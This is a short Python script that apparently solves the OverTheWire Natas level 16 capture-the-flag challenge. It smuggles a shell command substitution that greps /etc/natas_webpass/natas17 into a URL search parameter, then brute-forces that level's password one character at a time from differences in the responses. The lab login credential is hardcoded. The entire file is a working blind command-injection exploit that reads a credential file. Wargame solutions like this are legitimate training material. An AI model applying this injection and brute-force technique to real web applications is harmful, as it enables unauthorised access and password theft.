#! /usr/bin/env python3
import requests

pwd = ''
baseUrl = 'http://natas16.natas.labs.overthewire.org/?needle=$(grep -e ^%.* /etc/natas_webpass/natas17)love'
alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
for i in range(0, 50):
    print('Current pwd: "'+pwd+'". Bruteforcing', end='')
    for l in alphabet:
        print('.', end='', flush=True)
        url = baseUrl.replace('%', pwd+l)
        r = requests.get(url, auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
        if 'love' not in r.text:
            pwd += l
            print('letter found:', l)
            break;
